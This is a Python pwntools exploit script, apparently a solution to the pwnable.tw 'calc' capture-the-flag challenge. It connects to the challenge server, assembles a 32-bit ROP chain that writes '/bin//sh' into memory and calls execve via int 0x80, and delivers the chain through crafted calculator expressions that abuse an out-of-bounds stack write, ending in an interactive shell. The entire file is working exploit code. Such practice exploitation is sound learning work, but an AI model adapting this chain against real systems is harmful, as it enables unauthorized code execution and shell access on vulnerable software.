#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./calc')
	bin = ELF('./calc')
else:
	cn = remote('chall.pwnable.tw', 10100)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


from struct import pack

# Padding goes here
p = ''
p += p32(0x804967a)
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080ec060) # padding without overwrite ebx
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x08049a21) # int 0x80
for i in range(len(p)/4-1):
    cn.sendline('+'+str(369+i)+'-'+str(u32(p[i*4:i*4+4]))+'+'+str(u32(p[i*4+4:i*4+8])))

cn.sendline('')

cn.interactive()